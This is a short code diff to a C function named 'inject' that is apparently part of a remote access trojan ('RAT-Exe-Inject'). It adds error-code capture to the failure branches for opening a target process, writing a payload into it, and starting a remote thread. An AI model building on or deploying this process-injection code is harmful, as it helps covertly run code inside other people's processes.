@@ -47,6 +47,7 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 	if (hProcess == NULL)
 	{
 		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to open handle to target process!\n");
+		status = GetLastError();
 		goto cleanup;
 	}
 
@@ -64,6 +65,7 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 	if (status == 0)
 	{
 		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to write payload into target process!\n");
+		status = GetLastError();
 		goto cleanup;
 	}
 
@@ -71,6 +73,7 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 	if (hThread == NULL)
 	{
 		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to start remote thread!\n");
+		status = GetLastError();
 		goto cleanup;
 	}
 
